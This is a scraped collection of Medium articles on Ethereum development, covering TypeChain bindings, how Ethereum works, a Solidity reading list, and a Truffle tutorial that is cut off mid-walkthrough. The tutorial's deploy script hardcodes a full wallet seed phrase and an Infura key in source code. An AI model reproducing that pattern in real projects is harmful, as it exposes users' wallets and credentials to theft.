www.zastrin.com", "responses": 2, "tags": ["Blockchain", "Solidity", "Ethereum", "Development", "Smart Contracts"]}, {"title": "Introducing TypeChain \u2014 Typescript bindings for Ethereum smart contracts", "post_link": "https://blog.neufund.org/introducing-typechain-typescript-bindings-for-ethereum-smart-contracts-839fc2becf22?source=search_post", "author_name": "Chris Kaczor", "author_link": "https://blog.neufund.org/@krzkaczor", "publish_date": "2017-12-11", "last_modified_date": "2018-06-12", "readtime": "3.64", "claps": 833, "voters": 103, "content": "Introducing TypeChain \u2014 Typescript bindings for Ethereum smart contractsChris KaczorFollowDec 11, 2017 \u00b7 4 min readAs you might have read, we decided to use Typescript as the main language for our projects at Neufund. It brings improved type safety and provides development confidence not otherwise available in Javascript.Even though Typescript can ensure correctness of your code, it\u2019s helpless when 3rd party libraries come into play. For external dependencies written in Javascript, you need to provide typings, i.e. type information about available functions and types. Some libraries (especially those written in TS) have typings build in. For others you can find typings on npm. But the situation becomes even more complicated when you work with dynamically generated types such as smart contract wrappers.With TypeChain, Typescript loves Ethereum Smart ContractsDynamic typing hellUsually to interact with a smart contract on the Ethereum blockchain you use Web3js: you pass an ABI and an address, you call methods, and create transactions regarding the given smart contract. Unfortunately, such dynamic interfaces \u2014 created during runtime \u2014 can\u2019t be expressed in the Typescript type system.Of course, on top of that it\u2019s hard to work with such wrappers, there is no code completion, and API is not intuitive.\u201cWhat was the name of that function again? Is this a constant function or do I need to create a transaction?\u201dPersonally, I lost a lot of time debugging cryptic error messages when I simply forgot to specify gas amount.We can do better than this.Enter TypeChainTypeChain is here to solve all these problems. It uses provided ABI files to generate typed wrappers for smart contracts. It still uses Web3js under the hood, but on the surface it provides robust, type safe API with support for promises and much more.They see me typin\u2019, they hatin\u2019Let\u2019s take a look at a practical example. Here is our smart contract:contract CounterContract {  uint public counter;  function DumbContract() public {    counter = 0;  }  function counterWithOffset(uint offset) public constant returns (uint sum) {    return counter + offset;  }  function countup(uint by) public {    counter += by;  }}Generated wrapper:import { BigNumber } from \"bignumber.js\";import {  TypeChainContract,  promisify,  ITxParams,  IPayableTxParams,  DeferredTransactionWrapper,} from \"./typechain-runtime\";export class DumbContract extends TypechainContract {  public readonly rawWeb3Contract: any;  public constructor(web3: any, address: string | BigNumber) {    const abi = [      //ABI    ];    super(web3, address, abi);  }  static async createAndValidate(web3: any, address: string | BigNumber): Promise<DumbContract> {    const contract = new DumbContract(web3, address);    const code = await promisify(web3.eth.getCode, [address]);    if (code === \"0x0\") {      throw new Error(`Contract at ${address} doesn't exist!`);    }    return contract;  }  public get counter(): Promise<BigNumber> {    return promisify(this.rawWeb3Contract.counter, []);  }  public counterWithOffset(offset: BigNumber | number): Promise<BigNumber> {    return promisify(this.rawWeb3Contract.counterWithOffset, [offset.toString()]);  }  public countupTx(by: BigNumber | number): DeferredTransactionWrapper<ITxParams> {    return new DeferredTransactionWrapper<ITxParams>(this, \"countup\", [by.toString()]);  }}You can use it like this:// create new instance of contract wrapper and assert that contract exists on blockchain (useful during development)const dumbContract = await DumbContract.createAndValidate(web3, contractAddress);// call getterawait dumbContract.counter;// call constant methodawait dumbContract.counterWithOffset(2);// create transactionawait dumbContract.countupTx(2).send({    from: accounts[0],    gas: 10000,});// you can easily get tx dataawait dumbContract.countupTx(2).getData();Thanks to our generated wrappers, code completion just works and Typescript compiler, as well as tslint, can do their jobs to ensure type safety (btw. check out TypeStrict project for achieving maximum type safety).Be aware: we strongly advise against committing generated files to your version control system! Make TypeChain part of your build process (e.g. by using post-install hook) and do not edit generated files directly. When you do this, if you ever change ABIs, the Typescript compiler will find any breaking changes for you. How cool is that? :)Customizing generated wrappersOften ABI files don\u2019t convey all the necessary information about a contract interface and you need to customize generated files. The same rule applies here: do not edit files directly. Instead, extend the generated contract with your \u2014 more specific \u2014 implementation.We are also evaluating different, more declarative ways of customizing generated wrappers, like API files which would add semantics to ABI files. You could for example specify that a given uint represents a timestamp and should be parsed as moment date.We hope for community input about this as we move forward. This is where you come in: help us by suggesting improvements and providing feedback!SummaryTypeChain saves programmers from writing lots of repetitive code and provides type safety at the same time. During the creation of our commitment app (which is, btw, finishing in less then a week) we used early versions of TypeChain. It has already proved itself to be useful and now we hope that other teams can benefit from our efforts.For more information, head to our Github page \u2014 TypeChain.Follow me on Twitter for news, tips & tricks regarding blockchain, Typescript and Javascript.Neufund ICBM is happening right now! Don\u2019t loose your chance to be part of our ecosystem. Head to https://commit.neufund.org/.Krzysztof Kaczor is the Lead Blockchain Developer at Neufund, a community-owned fundraising platform bridging the worlds of equity investments and blockchain.To learn more, check out Neufund\u2019s ICBM page or the whitepaper for a deep dive. Questions? Ask us anything on Twitter and Telegram!", "responses": 0, "tags": ["JavaScript", "Typescript", "Smart Contracts", "Ethereum", "Solidity"]}, {"title": "How Does Ethereum Work?", "post_link": "https://medium.com/@micheledaliessi/how-does-ethereum-work-8244b6f55297?source=search_post", "author_name": "Michele D'Aliessi", "author_link": "https://medium.com/@micheledaliessi", "publish_date": "2018-02-11", "last_modified_date": "2018-06-12", "readtime": "6.80", "claps": 972, "voters": 103, "content": "How Does Ethereum Work?Michele D'AliessiFollowFeb 11, 2018 \u00b7 7 min readThe logic and mechanics behind Ethereum explained in simple words.Ethereum is a platform on which anyone can build unstoppable\u00b9, decentralised applications. If you have never heard of Ethereum or if you don\u2019t know what it can be used for, I would strongly recommend to read \u201cWhat is Ethereum?\u201d before digging deeper and exploring how it works in this article.What is Ethereum?The ultimate guide to understand Ethereum in simple words.medium.comThe purpose of this article is to explain how Ethereum works by providing a general and non-technical overview of its logic and inner mechanics. Please keep in mind that what is described below is a simplified version of what actually happens, but it should be technical enough to give you a general understanding of how it works. Should you have any questions please write them as comments or private notes, it would help me refine this article over time and make it much clearer for future readers.We can see Ethereum as a stack of few layers built on top of each other. The first, basic layer that makes everything else possible is a large network of computers that process transactions and keep a shared database updated over time (the Ethereum blockchain). The second, is the software layer that allows developers to run programs called \u201csmart contracts\u201d on the Ethereum blockchain, using a programming language called \u201cSolidity\u201d. The third layer is made of applications that offer different services (from governance to identity management) to Ethereum users. The remarkable feature of this platform is that by leveraging the Ethereum hardware and software layers these applications are decentralised, lack a central point of failure and are somehow \u201cunstoppable\u201d. You just can\u2019t switch them off.Let\u2019s explore each of these layers in detail.Fig. 1 - The different layers of the Ethereum platform1. Ethereum hardware layer: blockchainMost of what you see on the web, including this article, is hosted by a server in a data center somewhere on the planet. When you open your browser and browse the web, your computer (client) connects to such servers and downloads the content that you\u2019re looking for. This client-server infrastructure was intended for an internet with few centralised repositories (servers) that would distribute content to many users (clients). However, today\u2019s internet connects many clients to other clients as we are all both creators and users of content (Web 2.0). Computers can connect together in a large network, and pass content to each other all the way from the computer that generated it to the computer that requested it. This large group of computers passing content to each other is known as a \u201cpeer-to-peer network\u201d.Ethereum hardware layer is a peer-to-peer network of computers that compute transactions and keep them in order in a shared ledger. This allows them to build a distributed database that can keep record of all the information that is shared in the network: all the transactions that take place. Each computer in the network is called \u201cnode\u201d, it validates incoming transactions and organises them into blocks that are then broadcasted to the whole Ethereum network. Here you can see the Ethereum network of computers processing transactions in real time (be patient, the website will take some time to load).Fig. 2 - Ethereum hardware layer: blockchainTransactions can contain both value and information. The value is expressed in \u201cEther\u201d, the digital currency of Ethereum platform. And the information is code that can pass data and trigger actions. This is relevant for the software layer of Ethereum, for the hardware layer let\u2019s just keep in mind that is made of hundreds of computers spread across the planet that are connected to one-another via the internet.Anyone can offer his/her own computer to process the transactions of the network simply by running some code on his/her laptop. There is a scheme of incentives that promotes the growth of Ethereum network, in fact those who run the nodes get rewarded in \u201cEther\u201d - that is a valuable asset as it can be used to make use of the applications running on the platform.This should be enough to give you a general understanding of Ethereum hardware layer. If you would like to learn the details of how these computers coordinate the work and process transactions you will need to learn the mechanics of blockchain technology: this article is a good start (it uses Bitcoin blockchain as example to explain the technology, but most of the content is valid for Ethereum as well\u00b2).2. Ethereum software layer: SolidityThe flexibility of Ethereum platform is what made it popular among the early Bitcoin and blockchain enthusiasts. In fact, while Bitcoin has been designed as a currency to transact value between different actors, Ethereum has been developed to extend the use of Bitcoin underling technology and build a broader, general purpose blockchain.Ethereum software layer has been built to allow the transaction of value in any shape or form, being it a currency, a house, an identity, the rights to use or reproduce a song or any other asset you can think of.Ethereum extended Bitcoin beyond its currency nature.To do so, a whole new programming language has been created, it\u2019s called \u201cSolidity\u201d. For those of you that are software developers, it\u2019s quite similar to JavaScript. Using Solidity programmers can build simple programs called \u201csmart contracts\u201d that can implement basic transactions logic.In example, a Smart Contract can implement the following logic: if both Mark and Bob send five Ether to Jack, then automatically send two Ether from Jack to Alice.Ethereum also allows anyone to create new digital currencies (or more specifically \u201ctokens\u201d) that can be exchanged by all Ethereum users. This enables a broad range of applications: from digitalising the reward points at your favorite coffee shop, to creating whole new economies in specific markets.In the picture below you can get a glimpse of what Solidity code looks like, this basic smart contract generates a new token and enables its transfer to other users.Fig. 3 - Ethereum software layer: Solidity and Smart ContractsAll Ethereum code is open source and available online on Github.com. In fact, anyone can download (and use) the code of the picture above for free to develop a new application. The open source nature of Ethereum allows anyone who wants to contribute to write new code and share it online, developing new features or strengthening the overall platform by fixing bugs. This also means that Ethereum platform is somehow self-evolving, as the community is constantly adding new code, very much like Wikipedia has editors adding new articles and editing the existing ones.Anyone can learn to program in Solidity, there are many free resources online, like the Ethereum official website or this gamified lessons with zombies.To summarise, Ethereum software layer enables software developers to design smart contracts that enable programmable transfer of value. All smart contracts code is public, so anyone can check what these programs actually execute.3. Ethereum application layer: dAppsThe combination of the hardware and software layers described above enable Ethereum to work as a global, decentralised super-computer on which third party applications can be executed.Even if many early adopters leveraged the \u201ctoken emission\u201d function of Ethereum to fundraise capital to launch new projects (Initial Coin Offerings) the applications of Ethereum extend way beyond the financial sector. There are more than 900 applications built on Ethereum, about 30% of them are live while the other 70% are still under development.Fig. 4 - Ethereum application layer: dAppsDue to the open and transparent nature of Ethereum, many developers around the world came together and built a strong and large community that is currently working to extend the functionalities and applications of this platform.Building public, decentralised applications has several benefits that outperform private, centralised applications, in particular:Transparency. Anyone can read the code and make sure the application does what it promises. All transactions are also public and can be tracked.Resilience. It\u2019s hard, or virtually impossible, to stop those applications once running on Ethereum.Better code. Since the code is public and any hacker can read it, bugs need to be fixed quickly and effectively, resulting in higher quality and more reliable code.New projects are getting started every day and several applications running on the platform are focused on improving the world we live in, just like this project by WWF.It looks like Ethereum could play a big role in shifting our current centralised Internet towards a more transparent, privacy-oriented and equal future.Useful linksLearn more about Ethereum project - linkSee the network of computers running Ethereum in real time - linkHow to get your own Ethereum wallet - 10$ free on CoinbaseHow to keep your Ether safe - linkHow to install and run your own Ethereum node - link (pro)Learn more about how blockchain technology works - linkIf you found this article useful please hit the \u201cClap\u201d button\ud83d\udc4f on the left as many times as you feel like or donate some Ether (ETH) to my address below: 0x7cf57FE1310f832B16bE1f38c2710bDfD2f820D5How Does the Blockchain Work?Blockchain technology explained in simple wordsmedium.comNotes:Unstoppable because in order to prevent those application to run you would need to take down the whole Ethereum network that is made of hundreds of computers spread around the world. So let\u2019s say they are virtually unstoppable, or just very hard to stop.Ethereum and Bitcoin blockchains had several differences already at concept stage, and their evolution is bringing them in different directions as they aim at different goals. You can learn more about those differences here.", "responses": 3, "tags": ["Blockchain", "Ethereum", "Solidity", "Bitcoin", "ICO"]}, {"title": "The Ethereum Developer Essential Reading List", "post_link": "https://medium.com/blockchannel/the-ethereum-developer-essential-reading-list-4fe5d788b294?source=search_post", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2017-11-07", "last_modified_date": "2018-05-04", "readtime": "2.76", "claps": 577, "voters": 98, "content": "The Ethereum Developer Essential Reading ListCrucial Links and Resources to Get Started QuicklySteven McKieFollowNov 7, 2017 \u00b7 3 min readThanks to Cent I was able to quickly compile this excellent list of resources for individuals seeking to learn the ins and outs of Solidity/Ethereum smart contract development. https://beta.cent.co/question/251.I like to compile these resources so you don\u2019t have to take the time to scour for them online with countless Google searches. I love reading things in blog/article form as most textbooks and tutorials can sometimes inundate you with unnecessary or out of date information (my OCD hates to learn things irrelevant from the past).If you\u2019re a developer, you\u2019ve likely already skipped this wall of text and moved on to clicking links; nice hustle. You can also try out Zastrin.com (use code \u201cBlockChannel\u201d for 50% off all available courses).ResourcesVideosDecypher MediaI make screencasts about software development. If you like these vids, feel free to send Ether donations to\u2026www.youtube.comDecypher TV - Ethereum Screencasts for DevelopersEdit descriptiondecypher.tvBlockChannelThe Anatomy of ERC20What\u2019s on the Inside of Ethereum\u2019s Most Popular Contractmedium.comSolidity Learning: State Specifiers and STATICCALLUpcoming Changes to Solidity and How They Functionmedium.comSolidity Learning: Revert(), Assert(), and Require() in Solidity, and the New REVERT Opcode in the\u2026Upcoming Changes to Solidity and How They Functionmedium.comA Crash Course in Mechanism Design for Cryptoeconomic ApplicationsUnderstanding the Basic Fundamentals of \u201cCryptoeconomics\u201dmedium.comOthersEthereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioHomeDapps for Beginners Welcome to the temporary home of learning materials relating to development on ethereum. Inside you\u2026dappsforbeginners.wordpress.comethereum/wikiwiki - The Ethereum Wiki -github.comSolidity - Solidity 0.4.19 documentationSolidity is a contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed\u2026solidity.readthedocs.ioTruffleFramework.com - Truffle SuiteYour Ethereum Swiss Army Knifetruffleframework.comFull Stack Hello World Voting Ethereum Dapp Tutorial \u2014 Part 1In my previous post, I explained the high level architecture of Ethereum platform comparing it to a web application. As\u2026medium.comMutation testing support for Solidity \u00b7 Issue #1172 \u00b7 ethereum/solidityWith the failure of TheDAO, it became evident that writing even a relatively simple smart contract correctly is a\u2026github.compirapira/bamboobamboo - Bamboo: a morphing smart contract languagegithub.comEthereum Blog - Promoting a free, decentralized and open futurePromoting a free, decentralized and open futurePromoting a free, decentralized and open futureblog.ethereum.orgEthereum Community ForumA Next-Generation Smart Contract and Decentralized Application Platformforum.ethereum.orgethereum/viperviper - New experimental programming languagegithub.comAn Introduction to LLL for Ethereum Smart Contract DevelopmentEthereum is hot. Very hot. As I write this, Ether has just hit the $100 mark. For this and other reasons there are now\u2026media.consensys.netSolidity Assembly - Solidity 0.4.19 documentationFor more fine-grained control especially in order to enhance the language by writing libraries, it is possible to\u2026solidity.readthedocs.ioandrolo/solidity-workshopsolidity-workshop - Educational material for Solidity. Complement to solidity.readthedocs.comgithub.comEthereum Stack ExchangeQ&A for users of Ethereum, the decentralized application platform and smart contract enabled blockchainethereum.stackexchange.comRemix - Solidity IDEEdit descriptionethereum.github.ioEthereum Builder's GuideEdit descriptionethereumbuilders.gitbooks.ioHow To Learn Solidity: The Ultimate Ethereum Coding GuideThis Guide will walk you step-by-step in learning Solidity. It's a pretty simple language to learn. The Ultimate\u2026blockgeeks.comLearn Solidity in Y MinutesEdit descriptionlearnxinyminutes.comLearn Solidity: Basics of Solidity By ExampleIn this post, we will learn the Solidity language by going through two example. Then we will dig deeper into each \u2026www.toshblocks.comEthereum for web developersI have been learning about Ethereum blockchain platform for some time and the more I learn, the more exciting it looks\u2026medium.comSolidity - Solidity 0.4.19 documentationSolidity is a contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed\u2026solidity.readthedocs.ioThe Hitchhiker\u2019s Guide to Smart Contracts in EthereumUpdated Oct 6th 2017, for Truffle v3.4.11 and Solidity v0.4.15.blog.zeppelin.solutions5 Essential Ethereum Dapp ToolsGetting started writing dapps is hard. You've got a lot of moving pieces, and half of them are in beta release. It's\u2026karl.tech11 Best Ethereum Development Tools to Grow Your StackBlockchain tech is getting chief officers hot and heavy. When it\u2019s your turn to show them your stack, will you distress\u2026hackernoon.com", "responses": 4, "tags": ["Ethereum", "Development", "Solidity", "Blockchain", "Decentralization"]}, {"title": "How Truffle Works Under the Hood", "post_link": "https://medium.com/heartbankacademy/how-truffle-works-under-the-hood-f1ff6add416c?source=search_post", "author_name": "Thon Ly", "author_link": "https://medium.com/@thonly", "publish_date": "2018-07-20", "last_modified_date": "2019-01-05", "readtime": "14.7", "claps": 611, "voters": 102, "content": "How Truffle Works Under the HoodEthereum dApp Development for Web DevelopersThon LyFollowJul 20, 2018 \u00b7 15 min readPhoto: https://github.com/trufflesuite/truffleIntroductionBacked by ConsenSys, Truffle is quickly becoming the premier framework for blockchain development. Like a Swiss army knife, Truffle packs together the best modules and tools to streamline smart contract creation, compilation, testing, and deployment onto Ethereum. In addition, it also supports frontend development using a Redux store that automatically syncs with the contract data. Thus, integration with React is simple and easy. For veterans who developed decentralized applications in the early days, the benefits of Truffle are obvious. For those new to dapp development, your timing is perfect!Written in JavaScript, Truffle modularizes key features to abstract away the complexity and cognitive load. However, if we simply depend on the framework for everything, we miss out on understanding how things actually work under the hood that makes blockchain so special. Any dabbler can code by following directions. Expertise and innovation, on the other hand, require awareness of underlying assumptions and the creativity to challenge them.Thankfully, since it\u2019s all just JavaScript, we should be able to mimic the main functionalities of Truffle from scratch. Starting from an empty node project, we will attempt to create a smart contract, compile it, test it, and deploy it to a real ethereum network. We will also link it to an actual user interface. In so doing, the author hopes to impart a deeper understanding of the core technologies such that development using Truffle is not a dependency, but an expression of a creative choice.Smart Contract1. Create2. Compile3. Test4. DeployUser Interface => Smart ContractA great primer is to have a clear mental model of the Ethereum application stack:A Complete Mental Model for Ethereum dApp DevelopmentBlockchain Application Development for Web Developersmedium.comOur project repo: https://github.com/HeartBankAcademy/dAppTruffle InitSince tokens are such an integral part of the Ethereum ecosystem, let\u2019s try to build one from scratch to better understand how Truffle works under the hood! With npm, we can begin by initializing an empty node project.$ npm initThen, we create empty files and folders with this architecture:build- Token.jsoncontracts- Token.solmigrations- compile.js- deploy.jstest- Token.test.jspackage.jsonLike a Truffle project, the contracts folder houses all the solidity files. By convention, these files should be capitalized to indicate that solidity contracts are akin to \u201cclasses\u201d from which contract \u201cinstances\u201d are instantiated. In our case, it\u2019s just Token.sol. The migrations folder houses the scripts that we use to compile and deploy our contracts. Running compile.js should compile all our solidity files into corresponding json files in the build folder. In our case, it\u2019s just Token.json.compile.js: contracts/*.sol => build/*.jsonWhen we run deploy.js, the bytecode inside our json files should be deployed onto the network of our choice.deploy.js: build/*.json => networkFinally, the test folder houses all our test files. In our case, it\u2019s just Token.test.js.In summary, our project directory should look like this:This step is \u201cequivalent\u201d to executing:$ truffle initWhich creates the following files and folders:Notice the similarities! \ud83d\ude09Truffle DevelopLike Remix, Truffle has a local blockchain we can use during development.$ truffle developWhen we execute this command, Truffle launches a local network on port 9545 and generates a mnemonic phrase from which the first 10 external accounts and private keys are shown for our convenience.Under the hood, Truffle uses a stripped-down version of ganache-cli (previously, TestRPC). Let\u2019s install it globally and then launch a local network to see the similarities.$ sudo npm install -g ganache-cli$ ganache-cliLike Truffle, ganache-cli also generates a mnemonic phrase and displays the first 10 external accounts and private keys. By default, blocks are mined instantly.Using the local network provided by Truffle on port 9545 is optional. If we prefer more controls over our local network, we can use ganache-cli instead by switching over to port 8545.// truffle.jsnetworks: {  development: {    host: \"127.0.0.1\",    port: 8545,    network_id: \"*\"  }}For example, with ganache-cli we can create a more realistic network by specifying a blockTime of 15 seconds.$ ganache-cli --blockTime 15Or, if we prefer a graphical user interface, we can use the ganache desktop app by switching over to port 7545.Now that we understand the function of ganache-cli, let\u2019s install it as a project dependency so we can import it for use later.$ npm install --save ganache-cliWe\u2019re now ready to start coding our smart contract!Truffle CompileTokens represent real-world assets, which we can buy with ethers. As such, the standard token contract, aka ERC20, is understandably complex. For simplicity, we can boil it down to this:In essence, a token contract is just an \u201cinternal\u201d public ledger. While the \u201cexternal\u201d public ledger records account balances in ethers, a token contract records account balances in \u201ctokens\u201d. We can achieve this by using a mapping data structure (balanceOf) with address as the key and uint256 as the value (line 4). As a map object, every \u201caddress balance\u201d in balanceOf will be initialized with 0.ethereum blockchain => \"external\" public ledgertoken contract => \"internal\" public ledgerThrough the constructor method, we can set the initialSupply of our tokens upon contract creation. For simplicity, the contract creator will initially possess all the tokens (line 6\u20138).Creator: msg.senderbalanceOf[msg.sender] = initialSupply;Thus, the distribution of tokens must begin from the contract creator. We can achieve this with a transfer method that accepts an address and a uint256 which specify to whom and how much (line 10\u201315).From: msg.sendertransfer(address _to, uint256 _value)Before decrementing the sender\u2019s balance and incrementing the recipient\u2019s balance by _value, we can perform require checks to ensure that the sender has sufficient tokens (line 11) and that the recipient\u2019s new balance does not overflow (line 12).require(balanceOf[msg.sender] >= _value);require(balanceOf[_to] + _value >= balanceOf[_to]);balanceOf[msg.sender] -= _value;balanceOf[_to] += _value;Altogether, our token contract becomes:To compile our contract, we can use solc, which Truffle utilizes under the hood. Let\u2019s install it as a dependency:$ npm install --save solcWe want our compile.js script to begin by deleting everything in the build folder. That way, we can make changes to our contracts and recompile them anytime. In other words, we want to programmatically:Delete the build folder and everything inside.Recreate a new build folder.For each solidity file in the contracts folder, read its content to memory.For each solidity file in memory, compile it also to memory.For each compiled solidity file, write it to the build folder with .json as the extension.To build paths to our files, we can use the standard path module. To read and write files, it\u2019s easier to use the fs-extra module instead of the standard fs module. Let\u2019s install that:$ npm install --save fs-extraThus, our script should require in solc, path, and fs-extra:const solc = require(\"solc\");const path = require(\"path\");const fs = require(\"fs-extra\");To build a path to the build directory, we can write:const buildPath = path.resolve(__dirname, \"../build\");To delete the build directory and create a new one in its place, we can write:fs.removeSync(buildPath);fs.ensureDirSync(buildPath);To build a path to our token contract, we can write:const tokenPath = path.resolve(__dirname, \"../contracts\", \"Token.sol\");To read its content to memory, we can write:const source = fs.readFileSync(tokenPath, \"utf8\");To compile its content, we can call:solc.compile(source, 1)The second parameter tells solc the number of contract \u201cclasses\u201d that are present in our file. In our case, it\u2019s just the Token class. When compiled, it looks like this:Notice that it\u2019s a json object. We\u2019re only interested in :Token because it contains the bytecode and interface (ABI) that we need. Thus, to compile and write to memory:const output = solc.compile(source, 1).contracts[\":Token\"];Finally, to write output to the build folder as Token.json:fs.outputJsonSync(path.resolve(buildPath, \"Token.json\"), output);Altogether, compile.js becomes:To run our compile.js script, we can execute this command from the project root:$ node migrations/compile.jsThis step is \u201cequivalent\u201d to executing:$ truffle compileWith that, we\u2019re now ready to test our token contract!Truffle TestUnder the hood, Truffle uses the mocha testing framework with chai for assertions. Let\u2019s also use mocha:$ npm install --save mochaFor simplicity, we can just use the standard assert library.To be able to test our token contract, we need a local network and a way to connect to a running client, i.e., a provider. We can set one up with geth, but we will need to sign every transaction manually with Metamask (via port 8545). To get around this, we can use the ganache provider instead which comes with external accounts in an \u201cunlocked\u201d state.ganache provider => local node => local networkThen, we need a way to interact with this provider using JavaScript. We can use web3 for this.JavaScript => web3 => ganache provider Because transactions take time to process by the network, almost every web3 call is asynchronous. Though still in beta, version 1.0 of web3 supports Promises and therefore async and await which make code so much easier to read. Let\u2019s install it:$ npm install --save web3@1.0.0-beta.34Thus, our test script begins by requiring assert, ganache-cli, and web3:const assert = require(\"assert\");const ganache = require(\"ganache-cli\");const Web3 = require(\"web3\");Then, we can create an instance of Web3 with ganache.provider() as the constructor argument:const web3 = new Web3(ganache.provider());Now, we can use this web3 instance to instantiate our token contract. To do so, we will need the interface and bytecode from Token.json.const { interface, bytecode } = require(\"../build/Token\");To connect web3 with the interface, we can write:await new web3.eth.Contract(JSON.parse(interface))To deploy the bytecode, we can utilize the deploy method:.deploy({    data: bytecode,    arguments: [INITIAL_SUPPLY]})We can also pass in our constructor arguments to arguments as an array. To actually send the transaction, we can utilize the send method:.send({ from: accounts[0], gas: 1000000 })We use .send() whenever we want to update our contract\u2019s state. Such actions alway return the transaction hash except when deploying. Available parameters are from, gas, gasPrice, and value. The originating address (from) is required but the rest is optional (default values come from ganache). gas and gasPrice specify the gas limit and unit cost of gas, while value specifies how much wei to transfer. If we only want to read data on our contract, we use .call() instead. Reading data is always free..send() => update contract's state // not free.call() => read contract's state // freeAs we\u2019ve seen, ganache comes with 10 external accounts for us to use. We can access them through:accounts = await web3.eth.getAccounts();Thus, to deploy a fresh instance of our contract before each unit test, we can use the following test harness:Here, we\u2019ve arbitrarily chosen to deploy the contract from the first external account: accounts[0]We\u2019re now ready to write some unit tests! To begin, we should test that our token contract has indeed been deployed onto the local network. Whenever deployment is successful, web3 returns an instance of the contract that looks like this:Notice that we can access all our public variables and functions through the methods property. Notice also that under options, the address property contains the address to our contract instance on the network. We can use this fact to make an assertion that address must exist for the test to pass.it(\"deploys a contract\", () => {    assert.ok(token.options.address);});For our second test, let\u2019s verify that the contract creator does indeed have possession of all the tokens upon contract instantiation. Through the methods property, we can call balanceOf and pass it accounts[0].it(\"has initial supply\", async () => {    const supply = await token.methods.balanceOf(accounts[0]).call();    assert.equal(supply, INITIAL_SUPPLY);});For our third test, let\u2019s verify that our transfer method actually behaves as we intended.From: accounts[0]To: accounts[1]Amount: TOKENSResult: balance of accounts[0] and accounts[1] should updateTo make this transfer, we can call our transfer method through the methods property like so:await token.methods.transfer(accounts[1], TOKENS)    .send({ from: accounts[0] });To check that the transfer succeeded, we make two more calls to get the new balance of accounts[0] and accounts[1].const fromBalance = await token.methods.balanceOf(accounts[0]).call();const toBalance = await token.methods.balanceOf(accounts[1]).call();Then, we can verify that their balances have been appropriately updated:it(\"can transfer tokens\", async () => {    const TOKENS = 10;    const txHash = await token.methods      .transfer(accounts[1], TOKENS)      .send({ from: accounts[0] });    const fromBalance = await token.methods.balanceOf(accounts[0]).call();    const toBalance = await token.methods.balanceOf(accounts[1]).call();    assert.equal(fromBalance, INITIAL_SUPPLY - TOKENS);    assert.equal(toBalance, TOKENS);});For our last test, let\u2019s verify that the sender needs to have a sufficient balance.From: accounts[1]To: accounts[0]Amount: 10Result: should failTo do this, we can use a try/catch statement to catch the error and assert that it must exist:it(\"requires sufficient balance\", async () => {    try {        await token.methods.transfer(accounts[0], 10).send({ from: accounts[1] });        assert.fail();    } catch (error) {        assert.ok(error);    }});Putting all our unit tests together, we have:To run our tests with npm, we need to add mocha to our package.json file:\"scripts\": {    \"test\": \"mocha\"}Now, we can easily execute:$ npm run testThis is \u201cequivalent\u201d to executing:$ truffle testWith all tests passing, we\u2019re ready to deploy our contract to a real Ethereum network!Truffle MigrateDuring our tests, we used the ganache provider to deploy our contract to our local network. Likewise, to deploy our contract to the public Ethereum network, we need a provider that connects to a real Ethereum node. We could set one up locally with geth, but for simplicity, we will use Infura instead. Also backed by ConsenSys, Infura provides endpoints that we can utilize to easily create a provider.smart contract => ganache provider => local networksmart contract => Infura provider => public networkTo create a custom provider, we can use truffle-hdwallet-provider, which Truffle utilizes under the hood:$ npm install --save truffle-hdwallet-providerInfura provides endpoints to the main network as well as all the test networks. Let\u2019s use the Rinkeby testnet so we don\u2019t have to spend real money. Let\u2019s also create a new vault on Metamask for testing. With the Rinkeby endpoint from Infura and the seed phrase from Metamask, we can create a provider like this:const Provider = require(\"truffle-hdwallet-provider\");const provider = new Provider(\"pepper stable ripple enrich provide    business ankle tank net lumber acquire earn\", \"https://rinkeby.infura.io/DPHGLx2mBJeWsuDv1jFV\");// seed phrase and endpoint only needed until we deploy and attain the address to our contract on the blockchainLike before, we can pass our provider to web3 to get a fresh instance:const Web3 = require(\"web3\");const web3 = new Web3(provider);Reusing the deploy logic from our test harness with this web3 instance, we get:Under the hood, Metamask also uses Infura! For reference, we output the contract address to the console. To run this script, we execute:$ node migrations/deploy.jsOur token contract is now live on Rinkeby!https://rinkeby.etherscan.io/address/0x6431505264aEF4CfEA510633C8Ce5970404C821fThis is \u201cequivalent\u201d to executing:$ truffle migrateFinally, let\u2019s create a frontend that connects to our live contract!Truffle Unbox DrizzleTo setup the boilerplate for our frontend, we can use Truffle to \u201cunbox\u201d Drizzle.$ truffle unbox drizzleDrizzle is awesome because it comes with a Redux store that syncs with our contract state.react dapp => redux store => contract stateTo better understand how this process works, we will use create-react-app instead, which Drizzle utilizes under the hood. Let\u2019s install it globally:$ sudo npm install -g create-react-appAnd then run the create-react-app command to create a boilerplate project called \u201creactapp\u201d:create-react-app reactappTo launch this app, we execute this command from the project root:$ npm run startLet\u2019s update the main App component in src/App.js to show the balance and a form to transfer tokens:We want our users to be able to use Metamask to sign and submit transactions to our live contract. We can achieve this by taking advantage of the web3 object that Metamask injects to the global window:This web3 object comes with a built-in provider that we can use:window.web3.currentProviderHowever, notice that this web3 version is 0.20.3. To use version 1.0 instead, we need to install it as a dependency:$ yarn install --save web3@1.0.0-beta.34Then, we can take advantage of Metamask\u2019s provider like this:import Web3 from \"web3\";const web3 = new Web3(window.web3.currentProvider);By using our version of web3, we also ensure that it will not suddenly change and break our code. Understandably, Metamask plans to stop injecting the web3 object after realizing that most dapps only need its provider. In the near future, ethereumProvider will be injected instead.dapp => web3 => ethereumProvider => live contractLet\u2019s export our web3 instance for other files to use:To connect to our live contract, we need the ABI from our compilation process and the address of our contract on Rinkeby:const token = new web3.eth.Contract(ABI, ADDRESS);Copying over the ABI from Token.json and the contract address from running deploy.js, we can export our live contract instance like so:Now, we can import our token instance and web3 instance for our App component to use:In the componentDidMount lifecycle method, we can make a web3 call to get all the user\u2019s Metamask accounts (line 12):const accounts = await web3.eth.getAccounts();Then, we can call our token contract to get the balance of the first account (line 13):const balance = await token.methods.balanceOf(accounts[0]).call();In Metamask, the currently selected account is always accounts[0].To help process the form submittal, we can create a helper method that calls our contract\u2019s transfer function (line 18\u201332). Note that we don\u2019t have to specify the gas and gasPrice because Metamask will automatically calculate the best values for the user.form submit => react transfer method => contract transfer functionBecause transactions take time to process on a real network, we should provide a status message to inform the user:this.setState({ status: \"Transfer in progress...\" });Let\u2019s test the UI! When we choose the Metamask account that created the token contract (Account 1), we see the right balance of 1000, our initial supply.Selecting a different account shows the appropriate balance of 0. Let\u2019s now make a 